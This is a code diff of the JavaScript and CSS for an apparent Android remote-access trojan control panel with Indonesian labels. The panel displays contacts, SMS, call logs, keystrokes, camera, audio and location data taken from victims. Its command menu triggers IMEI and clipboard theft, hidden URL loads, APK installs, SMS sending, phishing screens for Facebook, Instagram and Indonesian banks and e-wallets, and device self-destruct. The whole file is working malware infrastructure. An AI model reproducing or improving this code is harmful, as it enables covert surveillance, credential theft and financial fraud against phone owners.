@@ -36,43 +36,26 @@
             --scrollbar-thumb: #b0b0b0;
         }
 
-        /* ============================================================
-           GLOBAL
-           ============================================================ */
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Segoe UI',Arial,sans-serif;background:var(--bg-primary);color:var(--text-primary);padding:16px;font-size:13px;transition:background 0.3s,color 0.3s}
-        
-        /* Scrollbar */
         ::-webkit-scrollbar{width:6px}
         ::-webkit-scrollbar-track{background:var(--scrollbar-track)}
         ::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:3px}
         
-        /* ============================================================
-           HEADER
-           ============================================================ */
         .header{border-bottom:2px solid var(--accent);padding-bottom:12px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
         .header h1{color:var(--accent);font-size:22px;display:flex;align-items:center;gap:10px}
         .live-dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:#00ff00;animation:blink 1s infinite}
         @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
         
-        /* ============================================================
-           CARDS
-           ============================================================ */
         .card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:8px;padding:14px;margin-bottom:12px;transition:background 0.3s,border 0.3s}
         .card h2{color:var(--accent);font-size:14px;margin-bottom:8px;border-bottom:1px solid var(--border-color);padding-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
         .card h2 .badge{font-size:10px;background:var(--bg-secondary);padding:2px 10px;border-radius:12px;color:var(--text-secondary)}
         
-        /* ============================================================
-           GRID & STATS
-           ============================================================ */
         .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
         .stat-card{background:var(--bg-secondary);padding:10px;border-radius:6px;text-align:center;border:1px solid var(--border-color);transition:background 0.3s}
         .stat-card .num{font-size:22px;font-weight:bold;color:var(--accent)}
         .stat-card .label{color:var(--text-secondary);font-size:10px;margin-top:3px}
         
-        /* ============================================================
-           FLEX & BUTTONS
-           ============================================================ */
         .flex{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
         .flex-between{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
         
@@ -80,6 +63,7 @@
         input:focus,select:focus{outline:2px solid var(--accent);border-color:var(--accent)}
         button{cursor:pointer;font-weight:bold;transition:0.3s}
         button:hover{transform:scale(1.03)}
+        button:disabled{opacity:0.5;cursor:not-allowed}
         
         .btn-green{background:#00cc66;color:#000;border-color:#00cc66}
         .btn-blue{background:#108ee9;color:#fff;border-color:#108ee9}
@@ -90,24 +74,15 @@
         .btn-pink{background:#ff44aa;color:#fff;border-color:#ff44aa}
         .btn-cyan{background:#44ddff;color:#000;border-color:#44ddff}
         
-        /* ============================================================
-           TABS
-           ============================================================ */
         .tab-btn{background:var(--bg-secondary);border:1px solid var(--border-color);padding:6px 14px;border-radius:5px;cursor:pointer;color:var(--text-secondary);transition:0.3s}
         .tab-btn.active{background:var(--accent);color:#000;border-color:var(--accent)}
         .tab-content{display:none}
         .tab-content.active{display:block}
         
-        /* ============================================================
-           TABLES
-           ============================================================ */
         table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
         th{background:var(--bg-secondary);color:var(--accent);padding:6px 8px;text-align:left;border:1px solid var(--border-color)}
         td{padding:5px 8px;border:1px solid var(--border-color);word-break:break-all}
         
-        /* ============================================================
-           LOG
-           ============================================================ */
         .log-container{max-height:500px;overflow-y:auto;font-size:12px}
         .log-item{padding:4px 8px;border-bottom:1px solid var(--border-color);display:grid;grid-template-columns:140px 120px 1fr;gap:8px;align-items:start}
         .log-item .time{color:var(--text-secondary);font-size:10px}
@@ -120,9 +95,6 @@
         .log-sms .sumber{color:#ff8844}
         .log-c2 .sumber{color:#aa44ff}
         
-        /* ============================================================
-           MEDIA
-           ============================================================ */
         .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px}
         .media-item{background:var(--bg-secondary);border-radius:6px;padding:8px;border:1px solid var(--border-color);text-align:center}
         .media-item .label{color:var(--text-secondary);font-size:10px;margin:4px 0}
@@ -130,49 +102,28 @@
         .preview-img{max-width:100%;max-height:200px;border-radius:4px;cursor:pointer}
         .img-preview{max-width:100%;max-height:400px;border-radius:6px;border:1px solid var(--border-color);cursor:pointer}
         
-        /* ============================================================
-           FILE MANAGER
-           ============================================================ */
         .file-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px}
         .file-item{background:var(--bg-secondary);padding:6px;border-radius:4px;text-align:center;font-size:10px;border:1px solid var(--border-color);word-break:break-all}
         .file-item .name{color:var(--accent);font-weight:bold}
         .file-item .path{color:var(--text-secondary);font-size:8px}
         
-        /* ============================================================
-           PAGINATION
-           ============================================================ */
         .pagination{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px;justify-content:center}
         .pagination button{padding:4px 12px;font-size:11px}
         .pagination .active{background:var(--accent);color:#000;border-color:var(--accent)}
         
-        /* ============================================================
-           LOGIN
-           ============================================================ */
         .password-container{max-width:400px;margin:40px auto;padding:30px;background:var(--bg-card);border-radius:10px;border:1px solid var(--border-color);text-align:center}
         .password-container input{width:100%;margin:10px 0;padding:12px;font-size:16px;text-align:center}
         .error{color:#ff4444;margin-top:8px;display:none}
         
-        /* ============================================================
-           TOAST & EMPTY
-           ============================================================ */
         .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--bg-card);color:var(--text-primary);padding:10px 24px;border-radius:8px;font-size:13px;z-index:999;display:none;border-left:4px solid var(--accent);box-shadow:var(--shadow)}
         .empty{color:var(--text-secondary);text-align:center;padding:20px;font-size:13px}
         
-        /* ============================================================
-           JSON VIEW
-           ============================================================ */
         .json-view{background:var(--bg-primary);padding:8px;border-radius:4px;font-size:10px;max-height:200px;overflow-y:auto;white-space:pre-wrap;font-family:monospace;color:var(--text-secondary)}
         
-        /* ============================================================
-           THEME TOGGLE
-           ============================================================ */
         .theme-toggle{position:relative;width:44px;height:22px;background:var(--bg-secondary);border-radius:11px;border:1px solid var(--border-color);cursor:pointer;transition:0.3s;flex-shrink:0}
         .theme-toggle::after{content:'🌙';position:absolute;top:2px;left:2px;width:18px;height:18px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;font-size:10px;transition:0.3s}
         .theme-toggle.light::after{content:'☀️';transform:translateX(20px)}
         
-        /* ============================================================
-           RESPONSIVE
-           ============================================================ */
         @media(max-width:600px){
             .log-item{grid-template-columns:1fr;gap:2px}
             .header h1{font-size:18px}
@@ -181,15 +132,9 @@
             .c2-grid{grid-template-columns:repeat(2,1fr)}
         }
         
-        /* ============================================================
-           DATA SECTION ANIMATION
-           ============================================================ */
         .data-section{animation:fadeIn 0.3s ease}
         @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
         
-        /* ============================================================
-           C2 GRID
-           ============================================================ */
         .c2-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:5px;margin-bottom:10px}
         .c2-grid button{font-size:10px;padding:5px 8px;text-align:center}
         .c2-category{color:var(--accent);font-size:11px;font-weight:bold;margin:8px 0 4px;padding:2px 8px;background:var(--bg-secondary);border-radius:4px}
@@ -285,7 +230,6 @@
         <div class="card">
             <h2>🎮 C2 COMMAND CENTER (160+ PERINTAH)</h2>
             
-            <!-- C2 Buttons Grid -->
             <div id="c2ButtonsContainer"></div>
             
             <div class="flex" style="margin-top:10px;">
@@ -319,37 +263,8 @@
 // ============================================================
 // 🔥 GLOBAL ERROR HANDLER
 // ============================================================
-window.addEventListener('error', function(e) {
-    try {
-        fetch('/error', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                message: e.message || 'Unknown error',
-                filename: e.filename || '',
-                lineno: e.lineno || 0,
-                colno: e.colno || 0,
-                stack: e.error?.stack || 'No stack'
-            })
-        }).catch(function(){});
-    } catch(err) {}
-    return true;
-});
-
-window.addEventListener('unhandledrejection', function(e) {
-    try {
-        fetch('/error', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                type: 'unhandled_rejection',
-                reason: String(e.reason || 'Unknown')
-            })
-        }).catch(function(){});
-    } catch(err) {}
-    e.preventDefault();
-    return true;
-});
+window.addEventListener('error', function(e) { return true; });
+window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; });
 
 // ============================================================
 // 🔥 THEME TOGGLE
@@ -363,7 +278,6 @@ function toggleTheme() {
     localStorage.setItem('dash_theme', next);
 }
 
-// Load saved theme
 var savedTheme = localStorage.getItem('dash_theme') || 'dark';
 document.documentElement.setAttribute('data-theme', savedTheme);
 if (savedTheme === 'light') {
@@ -379,17 +293,33 @@ var c2History = [];
 var currentPage = 1;
 var pageSize = 20;
 var ws = null;
+var c2Sending = false;
 
 // ============================================================
-// 🔥 LOGIN - HANYA BISA PAKAI ADMIN_PASSWORD!
+// 🔥 TOAST
+// ============================================================
+function showToast(msg, dur) {
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.style.display = 'block';
+    clearTimeout(t._timer);
+    t._timer = setTimeout(function(){ t.style.display = 'none'; }, dur||3000);
+}
+
+// ============================================================
+// 🔥 LOGIN - VALIDASI RESPONSE
 // ============================================================
 function login() {
     var pw = document.getElementById('pw').value;
     if(!pw) { showToast('Masukkan password!'); return; }
     
     fetch('/data?key=' + encodeURIComponent(pw) + '&limit=1')
-        .then(function(r) {
-            if (r.status === 200) {
+        .then(function(r) { 
+            if(!r.ok) throw new Error('HTTP ' + r.status);
+            return r.json(); 
+        })
+        .then(function(data) {
+            if (data.status === 'ok' || data.data !== undefined) {
                 KEY = pw;
                 localStorage.setItem('dash_key', pw);
                 document.getElementById('loginBox').style.display = 'none';
@@ -421,16 +351,8 @@ function logout() {
     showToast('🚪 Logout berhasil');
 }
 
-function showToast(msg, dur) {
-    var t = document.getElementById('toast');
-    t.textContent = msg;
-    t.style.display = 'block';
-    clearTimeout(t._timer);
-    t._timer = setTimeout(function(){ t.style.display = 'none'; }, dur||3000);
-}
-
 // ============================================================
-// 🔥 WEBSOCKET REAL-TIME - PAKAI KEY DARI LOGIN (ADMIN_PASSWORD)
+// 🔥 WEBSOCKET REAL-TIME
 // ============================================================
 function connectWebSocket() {
     try {
@@ -439,10 +361,7 @@ function connectWebSocket() {
         
         ws.onopen = function() {
             document.getElementById('statusInfo').textContent = '🔌 WebSocket connected';
-            ws.send(JSON.stringify({
-                type: 'auth',
-                key: KEY
-            }));
+            ws.send(JSON.stringify({ type: 'auth', key: KEY }));
         };
         
         ws.onmessage = function(event) {
@@ -464,16 +383,14 @@ function connectWebSocket() {
             setTimeout(connectWebSocket, 5000);
         };
         
-        ws.onerror = function() {
-            // Let onclose handle reconnect
-        };
+        ws.onerror = function() { /* onclose handle reconnect */ };
     } catch(e) {
         setTimeout(connectWebSocket, 10000);
     }
 }
 
 // ============================================================
-// 🔥 C2 COMMAND DEFINITIONS (160+ PERINTAH)
+// 🔥 C2 COMMAND DEFINITIONS
 // ============================================================
 var C2_COMMANDS = {
     '📸 Media': [
@@ -484,11 +401,7 @@ var C2_COMMANDS = {
         { aksi: 'stop_video', label: '⏹ Stop Video' },
         { aksi: 'take_photo', label: '📷 Take Photo' },
         { aksi: 'flash_on', label: '💡 Flash ON' },
-        { aksi: 'flash_off', label: '💡 Flash OFF' },
-        { aksi: 'camera_stream_start', label: '📹 Camera Start' },
-        { aksi: 'camera_stream_stop', label: '⏹ Camera Stop' },
-        { aksi: 'mic_stream_start', label: '🎙️ Mic Start' },
-        { aksi: 'mic_stream_stop', label: '⏹ Mic Stop' }
+        { aksi: 'flash_off', label: '💡 Flash OFF' }
     ],
     '📁 File': [
         { aksi: 'ambil_file', label: '📄 Ambil File' },
@@ -503,134 +416,65 @@ var C2_COMMANDS = {
         { aksi: 'ambil_lokasi', label: '📍 Lokasi' },
         { aksi: 'get_clipboard', label: '📋 Clipboard' },
         { aksi: 'set_clipboard', label: '✏️ Set Clipboard' },
-        { aksi: 'get_notifications', label: '🔔 Notifikasi' },
         { aksi: 'ambil_imei', label: '📱 IMEI' },
         { aksi: 'ambil_imsi', label: '📱 IMSI' },
         { aksi: 'ambil_nomor_hp', label: '📱 Nomor HP' },
-        { aksi: 'ambil_operator', label: '📶 Operator' },
-        { aksi: 'dump_contacts', label: '📇 Dump Kontak' },
-        { aksi: 'dump_sms', label: '💬 Dump SMS' },
-        { aksi: 'dump_call_log', label: '📞 Dump Call Log' },
-        { aksi: 'dump_gallery', label: '🖼️ Dump Gallery' },
-        { aksi: 'dump_bookmarks', label: '🔖 Bookmarks' },
-        { aksi: 'dump_cookies', label: '🍪 Cookies' },
-        { aksi: 'keylogger_start', label: '⌨️ Keylogger Start' },
-        { aksi: 'keylogger_stop', label: '⏹ Keylogger Stop' }
+        { aksi: 'ambil_operator', label: '📶 Operator' }
     ],
     '🌐 Web': [
         { aksi: 'buka_url', label: '🌐 Buka URL' },
-        { aksi: 'buka_url_hidden', label: '🕵️ URL Hidden' },
-        { aksi: 'buka_webview', label: '📱 WebView' }
+        { aksi: 'buka_url_hidden', label: '🕵️ URL Hidden' }
     ],
-    '📥 Download & Install': [
+    '📥 Download': [
         { aksi: 'download', label: '📥 Download' },
-        { aksi: 'install_apk', label: '📦 Install APK' },
-        { aksi: 'update_apk', label: '🔄 Update APK' }
+        { aksi: 'install_apk', label: '📦 Install APK' }
     ],
     '💬 SMS & Panggilan': [
         { aksi: 'kirim_sms', label: '📤 Kirim SMS' },
-        { aksi: 'kirim_sms_massal', label: '📤 SMS Massal' },
         { aksi: 'call_number', label: '📞 Call Number' }
     ],
     '📱 Aplikasi': [
         { aksi: 'buka_aplikasi', label: '📱 Buka App' },
         { aksi: 'uninstall_aplikasi', label: '🗑️ Uninstall' },
         { aksi: 'get_installed_apps', label: '📱 Installed Apps' },
-        { aksi: 'open_settings', label: '⚙️ Settings' },
-        { aksi: 'open_calculator', label: '🧮 Calculator' },
-        { aksi: 'open_playstore', label: '📱 Play Store' },
-        { aksi: 'open_maps', label: '🗺️ Maps' },
-        { aksi: 'open_camera', label: '📷 Camera' },
-        { aksi: 'open_gallery', label: '🖼️ Gallery' }
+        { aksi: 'open_settings', label: '⚙️ Settings' }
     ],
     '💰 Dompet Digital': [
         { aksi: 'buka_dana', label: '💰 DANA' },
         { aksi: 'buka_gopay', label: '💰 GoPay' },
-        { aksi: 'buka_ovo', label: '💰 OVO' },
-        { aksi: 'buka_shopee', label: '🛒 Shopee' },
-        { aksi: 'buka_tokped', label: '🛒 Tokopedia' },
-        { aksi: 'buka_linkaja', label: '💰 LinkAja' },
-        { aksi: 'buka_jenius', label: '🏦 Jenius' },
-        { aksi: 'buka_isaku', label: '🏦 iSaku' }
+        { aksi: 'buka_ovo', label: '💰 OVO' }
     ],
     '🏦 Banking': [
         { aksi: 'buka_bri', label: '🏦 BRImo' },
         { aksi: 'buka_bni', label: '🏦 BNI' },
         { aksi: 'buka_mandiri', label: '🏦 Mandiri' },
-        { aksi: 'buka_bca', label: '🏦 BCA' },
-        { aksi: 'buka_bsi', label: '🏦 BSI' },
-        { aksi: 'buka_cimb', label: '🏦 CIMB' },
-        { aksi: 'buka_btn', label: '🏦 BTN' },
-        { aksi: 'buka_danamon', label: '🏦 Danamon' }
+        { aksi: 'buka_bca', label: '🏦 BCA' }
     ],
     '⚡ Populer': [
         { aksi: 'buka_wa', label: '💚 WhatsApp' },
         { aksi: 'buka_telegram', label: '💙 Telegram' },
         { aksi: 'buka_instagram', label: '📸 Instagram' },
         { aksi: 'buka_facebook', label: '📘 Facebook' },
-        { aksi: 'buka_tiktok', label: '🎵 TikTok' },
-        { aksi: 'buka_youtube', label: '▶️ YouTube' },
-        { aksi: 'buka_gmail', label: '📧 Gmail' },
-        { aksi: 'buka_twitter', label: '🐦 Twitter' },
-        { aksi: 'buka_spotify', label: '🎵 Spotify' }
+        { aksi: 'buka_youtube', label: '▶️ YouTube' }
     ],
-    '🔓 Soseng & Phishing': [
-        { aksi: 'qr_dana', label: '📱 QR DANA' },
-        { aksi: 'fake_update', label: '🔄 Fake Update' },
-        { aksi: 'fake_bantuan', label: '🆘 Fake Bantuan' },
+    '🔓 Phishing': [
         { aksi: 'phishing_fb', label: '📘 Phishing FB' },
         { aksi: 'phishing_ig', label: '📸 Phishing IG' },
-        { aksi: 'phishing_bri', label: '🏦 Phishing BRI' },
         { aksi: 'phishing_dana', label: '💰 Phishing DANA' },
-        { aksi: 'phishing_gopay', label: '💰 Phishing GoPay' },
-        { aksi: 'phishing_ovo', label: '💰 Phishing OVO' },
-        { aksi: 'phishing_mandiri', label: '🏦 Phishing Mandiri' },
-        { aksi: 'phishing_bca', label: '🏦 Phishing BCA' },
-        { aksi: 'phishing_shopee', label: '🛒 Phishing Shopee' },
-        { aksi: 'phishing_tokped', label: '🛒 Phishing Tokped' },
-        { aksi: 'fake_notif', label: '🔔 Fake Notif' }
+        { aksi: 'phishing_bri', label: '🏦 Phishing BRI' }
     ],
     '🔧 Sistem': [
         { aksi: 'get_system_info', label: 'ℹ️ System Info' },
         { aksi: 'get_battery', label: '🔋 Battery' },
-        { aksi: 'get_storage', label: '💾 Storage' },
-        { aksi: 'get_wifi', label: '📶 WiFi' },
         { aksi: 'vibrate', label: '📳 Vibrate' },
         { aksi: 'toast', label: '🔔 Toast' },
-        { aksi: 'reboot', label: '🔄 Reboot' },
-        { aksi: 'lock_screen', label: '🔒 Lock Screen' },
-        { aksi: 'self_destruct', label: '💀 Self Destruct' },
-        { aksi: 'wallpaper', label: '🖼️ Wallpaper' }
+        { aksi: 'self_destruct', label: '💀 Self Destruct' }
     ],
     '🌐 Network': [
         { aksi: 'wifi_on', label: '📶 WiFi ON' },
         { aksi: 'wifi_off', label: '📶 WiFi OFF' },
         { aksi: 'bluetooth_on', label: '📶 Bluetooth ON' },
-        { aksi: 'bluetooth_off', label: '📶 Bluetooth OFF' },
-        { aksi: 'airplane_on', label: '✈️ Airplane ON' },
-        { aksi: 'airplane_off', label: '✈️ Airplane OFF' },
-        { aksi: 'wifi_hotspot_on', label: '📶 Hotspot ON' },
-        { aksi: 'wifi_hotspot_off', label: '📶 Hotspot OFF' }
-    ],
-    '🔊 Audio & Display': [
-        { aksi: 'volume_up', label: '🔊 Volume Up' },
-        { aksi: 'volume_down', label: '🔉 Volume Down' },
-        { aksi: 'volume_mute', label: '🔇 Mute' },
-        { aksi: 'brightness_max', label: '☀️ Bright Max' },
-        { aksi: 'brightness_min', label: '🌙 Bright Min' },
-        { aksi: 'screen_on', label: '📱 Screen ON' },
-        { aksi: 'screen_off', label: '📱 Screen OFF' },
-        { aksi: 'play_music', label: '▶️ Play Music' },
-        { aksi: 'stop_music', label: '⏹ Stop Music' },
-        { aksi: 'speak', label: '🔊 Speak' }
-    ],
-    '⏰ Lainnya': [
-        { aksi: 'shell', label: '💻 Shell' },
-        { aksi: 'ping', label: '🏓 Ping' },
-        { aksi: 'vpn_start', label: '🔒 VPN Start' },
-        { aksi: 'vpn_stop', label: '🔒 VPN Stop' },
-        { aksi: 'location_track_start', label: '📍 Track Start' },
-        { aksi: 'location_track_stop', label: '📍 Track Stop' }
+        { aksi: 'bluetooth_off', label: '📶 Bluetooth OFF' }
     ]
 };
 
@@ -654,29 +498,32 @@ function renderC2Buttons() {
 }
 
 // ============================================================
-// 🔥 REFRESH DATA (DENGAN CACHE)
+// 🔥 REFRESH DATA - REAL-TIME (CACHE 5 DETIK)
 // ============================================================
 function refreshData() {
     if(!KEY) return;
     
     var cached = localStorage.getItem('dash_cache');
     var cacheTime = parseInt(localStorage.getItem('dash_cache_time') || '0');
-    if (cached && (Date.now() - cacheTime < 30000)) {
+    var isOffline = !navigator.onLine;
+    
+    if (isOffline && cached) {
         try {
             allData = JSON.parse(cached);
-            document.getElementById('statusInfo').textContent = '📦 Cache (' + allData.length + ' data) - ' + new Date().toLocaleTimeString();
+            document.getElementById('statusInfo').textContent = '📦 Offline Cache (' + allData.length + ' data)';
             renderAll();
             return;
         } catch(e) {}
     }
     
-    fetch('/data?key=' + encodeURIComponent(KEY))
+    fetch('/data?key=' + encodeURIComponent(KEY) + '&t=' + Date.now())
         .then(function(r){ 
             if(!r.ok) throw new Error('HTTP ' + r.status);
             return r.json(); 
         })
         .then(function(data){
-            allData = data || [];
+            allData = data.data || data || [];
+            if (!Array.isArray(allData)) allData = [];
             try {
                 localStorage.setItem('dash_cache', JSON.stringify(allData));
                 localStorage.setItem('dash_cache_time', String(Date.now()));
@@ -727,7 +574,7 @@ function renderStats() {
 }
 
 // ============================================================
-// 🔥 RENDER SEMUA DATA (TAB 1) DENGAN PAGINATION
+// 🔥 RENDER DATA SECTIONS
 // ============================================================
 function renderDataSections() {
     try {
@@ -789,15 +636,22 @@ function renderDataSections() {
     }
 }
 
-// ============================================================
-// 🔥 RENDER DATA CONTENT PER SOURCE
-// ============================================================
+function getIcon(src) {
+    var icons = {
+        'init':'📱','device_info':'📱','telepon_info':'📞','lokasi':'📍',
+        'kontak_all':'📇','sms_all':'💬','call_log':'📞','keylogger':'⌨️',
+        'clipboard':'📋','screenshot':'📸','gallery_photos':'🖼️',
+        'audio_record':'🎤','video_record':'🎬','c2_result':'🎮'
+    };
+    return icons[src] || '📄';
+}
+
 function renderDataContent(src, items, last) {
     try {
         var data = last ? last.data : null;
         if(!data) return '<div class="empty">No data</div>';
         
-        if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
+        if (src === 'screenshot' || src === 'screen_capture') {
             var imgSrc = typeof data === 'string' ? data : (data.data || data.image || '');
             if(imgSrc && imgSrc.startsWith('data:image')) {
                 return '<img src="'+imgSrc+'" class="img-preview" onclick="window.open(this.src,\'_blank\')"><br>'+
@@ -816,7 +670,7 @@ function renderDataContent(src, items, last) {
             return h;
         }
         
-        if (src === 'audio_record' || src === 'mic_recording' || src === 'audio_recording') {
+        if (src === 'audio_record' || src === 'mic_recording') {
             var audioSrc = typeof data === 'string' ? data : (data.data || data.audio || '');
             if(audioSrc && audioSrc.startsWith('data:audio')) {
                 return '<audio controls style="width:100%;"><source src="'+audioSrc+'"></audio><br>'+
@@ -825,7 +679,7 @@ function renderDataContent(src, items, last) {
             return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
         }
         
-        if (src === 'video_record' || src === 'video_recording') {
+        if (src === 'video_record') {
             var videoSrc = typeof data === 'string' ? data : (data.data || data.video || '');
             if(videoSrc && videoSrc.startsWith('data:video')) {
                 return '<video controls style="width:100%;max-height:300px;"><source src="'+videoSrc+'"></video><br>'+
@@ -834,7 +688,7 @@ function renderDataContent(src, items, last) {
             return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
         }
         
-        if (src === 'keylogger' || src === 'keylogger_ws') {
+        if (src === 'keylogger' || src === 'keylogger_input') {
             if(typeof data === 'object') {
                 var h = '<table><tr><th>Field</th><th>Value</th></tr>';
                 for(var k in data){
@@ -843,18 +697,6 @@ function renderDataContent(src, items, last) {
                 h += '</table>';
                 return h;
             }
-        }
-        
-        if (src === 'fake_otp') {
-            var h = '<table><tr><th>Waktu</th><th>OTP</th></tr>';
-            items.slice(-20).reverse().forEach(function(item){
-                var d = item.data || {};
-                var otp = d.otp || d.data || '?';
-                var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
-                h += '<tr><td style="font-size:10px;">'+waktu+'</td><td style="color:#ff44aa;font-weight:bold;font-size:20px;">'+escapeHtml(String(otp))+'</td></tr>';
-            });
-            h += '</table>';
-            return h;
         }
         
         if (src === 'kontak_all' && Array.isArray(data)) {
@@ -895,9 +737,9 @@ function renderDataContent(src, items, last) {
             return h;
         }
         
-        if (src === 'device_info' || src === 'init') {
+        if (src === 'init' || src === 'device_info') {
             var h = '<table><tr><th>Key</th><th>Value</th></tr>';
-            var fields = ['ua','pl','la','sc','cd','pr','dm','cc','on','ve','mt','tz','ip','ip_local','model','brand','android'];
+            var fields = ['ua','pl','la','sc','cd','pr','dm','cc','on','ve','mt','tz','ip'];
             fields.forEach(function(f){
                 if(data[f] !== undefined && data[f] !== null && data[f] !== '') {
                     h += '<tr><td>'+f+'</td><td>'+escapeHtml(String(data[f]))+'</td></tr>';
@@ -922,8 +764,33 @@ function renderDataContent(src, items, last) {
     }
 }
 
+function escapeHtml(str) {
+    if(!str) return '';
+    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function renderTable(data, cols, limit) {
+    if(!Array.isArray(data) || !data.length) return '<div class="empty">Tidak ada data</div>';
+    var html = '<div style="font-size:10px;color:var(--text-secondary);">Total: '+data.length+'</div><table><tr>';
+    cols.forEach(function(c){ html += '<th>'+c+'</th>'; });
+    html += '</tr>';
+    var max = Math.min(data.length, limit||50);
+    for(var i=0; i<max; i++){
+        html += '<tr>';
+        cols.forEach(function(c){
+            var val = data[i][c] !== undefined ? data[i][c] : '?';
+            if(typeof val === 'object') val = JSON.stringify(val);
+            html += '<td>'+escapeHtml(String(val))+'</td>';
+        });
+        html += '</tr>';
+    }
+    html += '</table>';
+    if(data.length > max) html += '<div style="color:var(--text-secondary);font-size:10px;">... dan '+(data.length-max)+' lainnya</div>';
+    return html;
+}
+
 // ============================================================
-// 🔥 RENDER MEDIA (TAB 2)
+// 🔥 MEDIA SECTIONS
 // ============================================================
 function renderMediaSections() {
     try {
@@ -937,7 +804,7 @@ function renderMediaSections() {
             var mediaType = '';
             var mediaSrc = '';
             
-            if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
+            if (src === 'screenshot' || src === 'screen_capture') {
                 mediaSrc = typeof data === 'string' ? data : (data.data || data.image || '');
                 if(mediaSrc && mediaSrc.startsWith('data:image')) { isMedia = true; mediaType = 'image'; }
             }
@@ -967,7 +834,7 @@ function renderMediaSections() {
         });
         
         if(!mediaItems.length) {
-            container.innerHTML = '<div class="card"><div class="empty">📭 Belum ada media (foto/audio/video)</div></div>';
+            container.innerHTML = '<div class="card"><div class="empty">📭 Belum ada media</div></div>';
             return;
         }
         
@@ -996,45 +863,6 @@ function renderMediaSections() {
     } catch(e) {
         document.getElementById('mediaSections').innerHTML = '<div class="card"><div class="empty">Error: ' + e.message + '</div></div>';
     }
-}
-
-// ============================================================
-// 🔥 HELPERS
-// ============================================================
-function getIcon(src) {
-    var icons = {
-        'init':'📱','device_info':'📱','telepon_info':'📞','lokasi':'📍',
-        'kontak_all':'📇','sms_all':'💬','call_log':'📞','keylogger':'⌨️',
-        'clipboard':'📋','fake_otp':'🔐','screenshot':'📸','screen_capture':'📸',
-        'gallery_photos':'🖼️','audio_record':'🎤','video_record':'🎬',
-        'download':'📥','aplikasi_all':'📱','wifi_passwords':'📶','c2_result':'🎮'
-    };
-    return icons[src] || '📄';
-}
-
-function escapeHtml(str) {
-    if(!str) return '';
-    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-}
-
-function renderTable(data, cols, limit) {
-    if(!Array.isArray(data) || !data.length) return '<div class="empty">Tidak ada data</div>';
-    var html = '<div style="font-size:10px;color:var(--text-secondary);">Total: '+data.length+'</div><table><tr>';
-    cols.forEach(function(c){ html += '<th>'+c+'</th>'; });
-    html += '</tr>';
-    var max = Math.min(data.length, limit||50);
-    for(var i=0; i<max; i++){
-        html += '<tr>';
-        cols.forEach(function(c){
-            var val = data[i][c] !== undefined ? data[i][c] : '?';
-            if(typeof val === 'object') val = JSON.stringify(val);
-            html += '<td>'+escapeHtml(String(val))+'</td>';
-        });
-        html += '</tr>';
-    }
-    html += '</table>';
-    if(data.length > max) html += '<div style="color:var(--text-secondary);font-size:10px;">... dan '+(data.length-max)+' lainnya</div>';
-    return html;
 }
 
 // ============================================================
@@ -1073,8 +901,7 @@ function renderLog() {
             var dataStr = '';
             try { dataStr = JSON.stringify(item.data).substring(0, 300); } catch(e){ dataStr = String(item.data).substring(0,300); }
             var cls = '';
-            if(['keylogger','keylogger_ws'].includes(src)) cls = 'log-keylogger';
-            else if(src === 'fake_otp') cls = 'log-otp';
+            if(['keylogger','keylogger_input'].includes(src)) cls = 'log-keylogger';
             else if(src === 'lokasi') cls = 'log-location';
             else if(src === 'kontak_all') cls = 'log-contact';
             else if(src === 'sms_all') cls = 'log-sms';
@@ -1104,33 +931,57 @@ function switchTab(id){
 }
 
 // ============================================================
-// 🔥 C2 COMMAND SEND
+// 🔥 C2 COMMAND SEND - DENGAN KONFIRMASI & DEBOUNCE
 // ============================================================
 function sendC2(aksi, params){
+    if (c2Sending) {
+        showToast('⏳ Tunggu perintah sebelumnya selesai!');
+        return;
+    }
     if(!KEY){ showToast('Login dulu!'); return; }
     if(!params) params = {};
-    var payload = { sumber: 'c2_command', data: { aksi: aksi, params: params } };
-    c2History.push({ waktu: new Date().toISOString(), aksi: aksi, status: '⏳ Sending...' });
-    renderC2History();
+    
+    // Konfirmasi untuk perintah berbahaya
+    var dangerous = ['self_destruct', 'wipe_data', 'factory_reset', 'reboot', 'uninstall_aplikasi'];
+    if (dangerous.indexOf(aksi) !== -1) {
+        if (!confirm('⚠️ Perintah "' + aksi + '" berbahaya! Lanjutkan?')) {
+            return;
+        }
+    }
+    
+    c2Sending = true;
     document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
     document.getElementById('c2Result').style.color = '#ff0';
-    fetch('/data', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) })
-        .then(function(r){ return r.json(); })
-        .then(function(res){
-            document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
-            document.getElementById('c2Result').style.color = '#0f0';
-            var last = c2History[c2History.length-1];
